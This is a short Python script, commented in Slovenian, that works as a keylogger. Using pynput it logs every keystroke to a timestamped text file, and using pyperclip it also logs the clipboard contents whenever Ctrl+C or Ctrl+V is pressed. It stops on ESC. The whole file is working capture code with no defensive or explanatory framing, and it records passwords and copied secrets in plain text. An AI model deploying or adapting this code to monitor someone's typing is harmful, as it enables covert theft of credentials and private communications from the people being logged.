# to je za tipkovnico IN za Clipboard stanje


from pynput import keyboard
import pyperclip
import logging
from datetime import datetime


# Log datoteka
log_filename = f"key_log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

clipboard_history = set()
ctrl_pressed = False  # Sledimo, ali je CTRL pritisnjen

def log_clipboard():
    try:
        content = pyperclip.paste()
        if content and content not in clipboard_history:
            clipboard_history.add(content)
            logging.info(f"Clipboard content: {content}")
    except Exception as e:
        logging.warning(f"Clipboard read error: {e}")

def on_press(key):
    global ctrl_pressed
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True

        if hasattr(key, 'char') and ctrl_pressed:
            if key.char == 'c' or key.char == 'v':
                log_clipboard()

        if hasattr(key, 'char'):
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error on key press: {e}")

def on_release(key):
    global ctrl_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False

    if key == keyboard.Key.esc:
        # Uporabnik ustavi program s pritiskom na ESC
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
